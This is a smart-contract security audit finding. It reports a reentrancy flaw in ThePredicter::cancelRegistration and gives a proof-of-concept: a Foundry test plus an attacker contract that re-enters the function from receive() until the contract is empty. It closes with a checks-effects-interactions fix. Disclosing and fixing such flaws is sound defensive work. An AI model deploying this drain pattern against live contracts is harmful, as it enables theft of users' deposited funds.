# [H-1] `ThePredicter::cancelRegistration` can be reentered to drain the contract

## Summary

The CEI pattern is not followed in the `ThePredicter::cancelRegistration` function. This allows an attacker to reenter the function and withdraw the entrance fee multiple times.

## Vulnerability Details

The following code snippet demonstrates the reentrancy vulnerability in the `ThePredicter::cancelRegistration` function.
Paste the following proof of code into the `ThePredicter.test.sol` file:

Test:

```javascript
function testReenterCancelRegistration() public playersRegistered {
        ReentrancyPlayer attacker = new ReentrancyPlayer(thePredicter);
        vm.deal(address(attacker), thePredicter.entranceFee());
        // Register and reenter cancelRegistration
        attacker.registerAndCancel();
        assertEq(address(thePredicter).balance, 0);
        // The ReentrancyPlayer should have the entrance fee of all four players
        assertEq(address(attacker).balance, 4*thePredicter.entranceFee());
    }
```

Attacker contract:

```javascript
contract ReentrancyPlayer {
    ThePredicter public thePredicter;

    constructor(ThePredicter _thePredicter) {
        thePredicter = _thePredicter;
    }

    function registerAndCancel() public {
        thePredicter.register{value: 0.04 ether}();
        thePredicter.cancelRegistration();
    }

    receive() external payable {
        if (address(thePredicter).balance >= thePredicter.entranceFee()) {
            thePredicter.cancelRegistration();
        }
    }
}
```

## Impact

An attacker can drain all funds from the contract including the entrance and prediction fees.

## Tools Used

Manual review

## Recommendations

Follow the CEI pattern in the `ThePredicter::cancelRegistration` function to prevent reentrancy attacks.
To do so move the state change to the beginning of the function before the external call.

```diff
    function cancelRegistration() public {
        if (playersStatus[msg.sender] == Status.Pending) {
+           playersStatus[msg.sender] = Status.Canceled;
            (bool success, ) = msg.sender.call{value: entranceFee}("");
            require(success, "Failed to withdraw");
-           playersStatus[msg.sender] = Status.Canceled;
            return;
        }
        revert ThePredicter__NotEligibleForWithdraw();
    }
```
